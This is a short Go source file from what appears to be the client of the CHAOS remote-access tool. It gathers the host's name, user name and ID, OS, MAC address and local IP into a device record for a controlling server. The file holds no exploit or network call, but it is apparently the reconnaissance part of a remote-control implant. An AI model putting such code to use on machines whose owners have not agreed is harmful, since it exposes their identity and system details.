package information

import (
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
	"os"
	"os/user"
	"runtime"
	"time"
)

type InformationService struct {
	ServerPort string
}

func NewInformationService(serverPort string) services.Information {
	return &InformationService{ServerPort: serverPort}
}

func (i InformationService) LoadDeviceSpecs() (*entities.Device, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, err
	}
	username, err := user.Current()
	if err != nil {
		return nil, err
	}
	macAddr, err := network.GetMacAddress()
	if err != nil {
		return nil, err
	}
	return &entities.Device{
		Hostname:       hostname,
		Username:       username.Name,
		UserID:         username.Username,
		OSName:         runtime.GOOS,
		OSArch:         runtime.GOARCH,
		MacAddress:     macAddr,
		LocalIPAddress: network.GetLocalIP().String(),
		Port:           i.ServerPort,
		FetchedUnix:    time.Now().UnixNano(),
	}, nil
}
